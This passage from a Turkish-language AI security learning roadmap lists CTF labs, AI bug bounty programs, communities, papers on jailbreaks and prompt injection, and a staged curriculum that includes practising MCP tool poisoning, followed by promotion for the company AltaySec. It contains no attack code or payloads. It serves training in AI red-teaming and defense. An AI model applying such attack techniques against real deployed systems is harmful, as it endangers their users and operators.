| ctf-prompt-injection | Dockerize, yerel LLM | [github.com/CharlesTheGreat77/ctf-prompt-injection](https://github.com/CharlesTheGreat77/ctf-prompt-injection) |
| 8ksec AI/LLM Challenges | Yapılandırılmış CTF | [academy.8ksec.io](https://academy.8ksec.io/course/ai-exploitation-challenges) |

---

## Bug Bounty Programları

| Program | Kapsam | Link |
|---------|--------|------|
| OpenAI Bug Bounty | ChatGPT, API, eklentiler | [bugcrowd.com/openai](https://bugcrowd.com/openai) |
| Google AI Bug Bounty | Gemini, Vertex AI | [bughunters.google.com](https://bughunters.google.com/) |
| Meta AI Bug Bounty | Llama modelleri | [facebook.com/whitehat](https://www.facebook.com/whitehat) |
| HuggingFace via ProtectAI | Hub, modeller, alanlar | [huntr.com](https://huntr.com/) |
| Anthropic Bug Bounty | Claude, API | [anthropic.com/security](https://www.anthropic.com/security) |
| Microsoft (Copilot, Azure AI) | Copilot, Azure OpenAI | [msrc.microsoft.com](https://msrc.microsoft.com/create-report) |
| Huntr (AI/ML odaklı) | Açık kaynak ML kütüphaneleri | [huntr.com](https://huntr.com/) |

---

## Topluluk ve Haberler

### Topluluklar
- [AI Village](https://aivillage.org/) — DEF CON'un AI güvenlik topluluğu
- [OWASP AI Exchange](https://owaspai.org/) — AI güvenlik için açık standart
- [OWASP Gen AI Security Project](https://genai.owasp.org/)
- [ProtectAI](https://protectai.com/) — AI güvenlik araştırması
- [Embrace the Red](https://embracethered.com/blog/) — LLM güvenliğinde önde gelen blog
- [r/llmsecurity](https://www.reddit.com/r/llmsecurity/) — En aktif LLM güvenlik subreddit'i

### Bültenler ve Bloglar
- [Simon Willison's Weblog](https://simonwillison.net/) — LLM güvenliğinde otoriter yorum
- [HiddenLayer Research](https://hiddenlayer.com/research/)
- [Lakera Blog](https://www.lakera.ai/blog)
- [PortSwigger Research](https://portswigger.net/research)
- [Adversa AI Blog](https://adversa.ai/blog/)

---

## Akademik Makaleler

| Makale | Yıl | Link |
|--------|-----|------|
| Explaining and Harnessing Adversarial Examples — Goodfellow et al. | 2014 | [arXiv](https://arxiv.org/abs/1412.6572) |
| Membership Inference Attacks — Shokri et al. | 2017 | [arXiv](https://arxiv.org/abs/1610.05820) |
| Extracting Training Data from LLMs — Carlini et al. | 2021 | [arXiv](https://arxiv.org/abs/2012.07805) |
| Not What You've Signed Up For — Greshake et al. | 2023 | [arXiv](https://arxiv.org/abs/2302.12173) |
| Jailbroken: How Does LLM Safety Training Fail? — Wei et al. | 2023 | [arXiv](https://arxiv.org/abs/2307.02483) |
| Universal and Transferable Adversarial Attacks — Zou et al. | 2023 | [arXiv](https://arxiv.org/abs/2307.15043) |
| Prompt Injection 2.0: Hybrid AI Threats | 2025 | [arXiv](https://arxiv.org/abs/2507.13169) |
| Securing AI Agents Against Prompt Injection | 2025 | [arXiv](https://arxiv.org/abs/2511.15759) |
| The Attacker Moves Second: Adaptive Attacks | 2025 | [arXiv](https://arxiv.org/abs/2510.09023) |
| Prompt Injection Attacks on Agentic Coding Assistants (SoK) | 2026 | [arXiv](https://arxiv.org/html/2601.17548v1) |
| The Landscape of Prompt Injection Threats in LLM Agents | 2026 | [arXiv](https://arxiv.org/abs/2602.10453) |

---

## Deneyim Düzeyine Göre Öğrenme Yolu

### 🟢 Başlangıç (0-3 Ay)
1. [PortSwigger Web Security Academy](https://portswigger.net/web-security) temellerini tamamla
2. Python öğren
3. [Google ML Crash Course](https://developers.google.com/machine-learning/crash-course)'u tamamla
4. [OWASP LLM Top 10 (2025)](https://genai.owasp.org/)'i oku
5. [Gandalf](https://gandalf.lakera.ai/)'ı tüm 8 seviyede tamamla
6. [Simon Willison'ın prompt injection makalesini](https://simonwillison.net/2023/May/2/prompt-injection-explained/) oku
7. [Andrej Karpathy — Intro to LLMs](https://www.youtube.com/watch?v=zjkBMFhNj_g)'i izle
8. [Prompt Injection Cheat Sheet — Seclify](https://blog.seclify.com/prompt-injection-cheat-sheet/)'i oku

### 🟡 Orta Düzey (3-9 Ay)
1. [MITRE ATLAS Matrisi](https://atlas.mitre.org/matrices/ATLAS/)'ni çalış
2. [PortSwigger LLM Attack Labs](https://portswigger.net/web-security/llm-attacks)'ı tamamla
3. [Damn Vulnerable LLM Agent](https://github.com/WithSecureLabs/damn-vulnerable-llm-agent)'ı kur ve hacklemeye çalış
4. [PromptTrace](https://prompttrace.airedlab.com/) ve [Crucible](https://crucible.dreadnode.io/) zorluklarını tamamla
5. [LLM Hacker's Handbook](https://github.com/forcesunseen/llm-hackers-handbook)'u oku
6. [Embrace The Red blogunu](https://embracethered.com/blog/) başından sona çalış
7. [Garak](https://github.com/leondz/garak) ve [PyRIT](https://github.com/Azure/PyRIT) ile deneyler yap
8. [MCP Prompt Injection: How AI Gets Hacked](https://www.youtube.com/watch?v=bO-7DB-3dL8)'i izle
9. [Palo Alto Unit 42 MCP Attack Vectors](https://unit42.paloaltonetworks.com/model-context-protocol-attack-vectors/)'ı oku

### 🔴 İleri Düzey (9+ Ay)
1. [DEF CON AI Village CTF](https://aivillage.org/)'e katıl
2. [Huntr](https://huntr.com/) veya [OpenAI Bug Bounty](https://bugcrowd.com/openai)'ye bulgu gönder
3. [ART](https://github.com/Trusted-AI/adversarial-robustness-toolbox) ve [CleverHans](https://github.com/cleverhans-lab/cleverhans) ile adversarial ML çalış
4. 2025-2026 akademik makalelerini oku
5. Yerel MCP ortamı kur; araç zehirleme ve gölgeleme dene
6. [Garak](https://github.com/leondz/garak) veya [AI Exploits](https://github.com/protectai/ai-exploits) gibi açık kaynak projelere katkıda bulun
7. Kendi savunmasız ajansal demo ortamını MCP entegrasyonuyla inşa et
8. Araştırma yaz ve yayınla — blog yazıları, CVE'ler, konferans konuşmaları

---

**Yazar Hakkında**  
*Fevzi Ege Yurtsevenler, Türkiye'nin yapay zeka güvenliği alanındaki öncü araştırmacılarından biridir. AltaySec'in kurucusu olarak Türkçe LLM güvenlik içerikleri üretiyor, eğitimler veriyor ve bu alanda Türkiye'nin ilk ekosistemini inşa ediyor. Gazi Üniversitesi'nde prompt injection eğitimi vermiş, LLM güvenliği alanında aktif araştırma sürdürmektedir.*

**İletişim:** [altaysec.com.tr](https://altaysec.com.tr) | LinkedIn: Fevzi Ege Yurtsevenler

---

*Son güncelleme: Nisan 2026*  
*Kaynak: [AI/ML Pentesting Roadmap (2026 Edition)](https://github.com/anmolksachan/AI-ML-Free-Resources-for-Security-and-Prompt-Injection)*  
*AltaySec — Türkiye'nin LLM Güvenlik Ekosistemi*

---

## 🌐 Bu Yol Haritasını Pratiğe Dökmek: AltaySec Eğitim Stack'i

Bu roadmap teorik yolu çiziyor; pratiği için **AltaySec**'in iki ücretsiz akademi platformu ve kurumsal eğitim programları kullanılabilir. [AltaySec](https://altaysec.com.tr), Türkiye'nin yapay zeka güvenliği odaklı **ilk** şirketidir.

### 🎓 İki Akademi, İki Farklı Yol

- **[LLM Security Akademi → ai.altaysec.com.tr](https://ai.altaysec.com.tr)** — Yapay zeka güvenliği özel: 5 öğrenme yolu (AI Foundations, Prompt Security, Secure AI Systems, AI Supply Chain Security, Data Poisoning & RAG Security), 14 modül, 35 lab. Multi-model (GPT, Claude, Llama, Gemini, Mistral, DeepSeek).
- **[AltaySec Akademi → akademi.altaysec.com.tr](https://akademi.altaysec.com.tr)** — Klasik pentest temelleri: 11 modül, 250+ quiz, Arcade ve sertifika. Bu roadmap'in Aşama 1 ön koşullarını karşılar.

### 🎯 Kariyer Hedefi: Kurumsal AI Pentester

Bu roadmap'i tamamlayan biri için AltaySec şu kanallar sunar:

- 🎓 **[LLM Security Bootcamp](https://altaysec.com.tr/bootcamp.html)** — Kurumsal yoğun program (2-4 hafta)
- 🛡️ **[AI Pentest hizmetleri](https://altaysec.com.tr/pentest.html)** — Aktif staj/proje fırsatları
- ⚔️ **[AltayDuel](https://duel.altaysec.com.tr)** — Agent yazarak rekabet et, ELO leaderboard'da yükseğe çıkın
- 💼 **[Ekibe Başvur](https://altaysec.com.tr/ekibe-basvur.html)** — AltaySec mühendislik takımı

### 🔗 AltaySec Kardeş Projeler — Roadmap Aşamalarına Eşleştirilmiş

- **Aşama 2** (LLM güvenlik kavramları) → **[LLM-Security-Nedir](https://github.com/fevziegeyurtsevenler/LLM-Security-Nedir)** + **[OWASP-LLM-TOP-10-TURKCE](https://github.com/fevziegeyurtsevenler/OWASP-LLM-TOP-10-TURKCE)**
- **Aşama 3** (Prompt injection) → **[Prompt-Injection-Nedir](https://github.com/fevziegeyurtsevenler/Prompt-Injection-Nedir)** + **[AltayDuel](https://duel.altaysec.com.tr)** + **[Bekçi laboratuvarı](https://altaysec.com.tr/arastirmalar/bekci-llm-prompt-injection-lab.html)**
- **Aşama 4** (Ajansal AI & MCP) → **[AI-Agent-Security-Nedir](https://github.com/fevziegeyurtsevenler/AI-Agent-Security-Nedir)** + **[RAG-Security-Nedir](https://github.com/fevziegeyurtsevenler/RAG-Security-Nedir)**
- **Aşama 7** (Araştırma & bug bounty) → **[AI-Security-Ogrenme-Rehberi](https://github.com/fevziegeyurtsevenler/AI-Security-Ogrenme-Rehberi)** + AltaySec araştırma serisi

### 📖 Yan okumalar

- [Türkiye'de Yapay Zeka Güvenliği: Öne Çıkan Şirketler ve İsimler (2026)](https://altaysec.com.tr/arastirmalar/turkiye-yapay-zeka-guvenligi-sirketleri-2026.html) — Sektörel saha haritası
- [Türkçe Prompt Injection: 297 Düellodan 5 Saldırı Kalıbı](https://altaysec.com.tr/arastirmalar/turkce-prompt-injection-5-saldiri-kalibi.html)

### 💼 İletişim

- 🌐 [altaysec.com.tr](https://altaysec.com.tr) · 💼 [LinkedIn](https://www.linkedin.com/company/altaysec/) · 📧 info@altaysec.com.tr

---

<p align="center">
  <sub>© 2026 <strong>AltaySec</strong> · Türkiye'nin İlk Yapay Zeka Güvenliği Şirketi<br>
  Kurucu: <strong>Fevzi Ege Yurtsevenler</strong> · LLM Security Araştırmacısı · Ankara, Türkiye</sub>
</p>
